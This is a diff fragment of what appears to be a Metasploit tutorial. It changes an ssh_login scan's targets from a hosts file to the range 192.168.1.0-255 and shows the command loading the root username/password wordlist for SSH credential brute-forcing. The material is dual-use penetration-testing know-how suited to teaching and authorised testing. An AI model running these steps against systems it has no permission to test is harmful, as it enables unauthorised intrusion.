@@ -109,8 +109,8 @@ Module options (auxiliary/scanner/ssh/ssh_login):
 We'll load the file that we created in the previous step with our targets as our "RHOSTS" (Remote Hosts):
 
 ```bash
-msf auxiliary(ssh_login) > set RHOSTS file:live_hosts.txt
-rhosts => file:live_hosts.txt
+msf auxiliary(ssh_login) > set RHOSTS 192.168.1.0-255
+rhosts => 192.168.1.0-255
 
 msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
